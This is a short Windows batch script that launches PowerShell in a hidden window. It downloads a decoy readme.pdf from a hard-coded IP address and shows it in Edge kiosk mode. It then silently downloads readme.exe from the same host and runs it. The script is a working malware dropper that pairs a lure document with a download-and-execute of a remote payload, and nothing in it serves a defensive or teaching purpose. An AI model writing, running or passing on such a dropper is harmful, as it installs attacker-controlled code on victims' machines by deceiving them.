@echo off
powershell -WindowStyle Hidden -Command ^
    "IWR -Uri "http://95.169.201.100:18960/uploads/test-2/readme.pdf" -OutFile "$env:temp\readme.pdf" ;  Start-Process 'msedge.exe' -ArgumentList \"--kiosk $env:temp\readme.pdf\" ; IWR -Uri "http://95.169.201.100:18960/uploads/test-2/readme.exe" -OutFile "$env:temp\readme.exe" ; start "$env:temp\readme.exe""
exit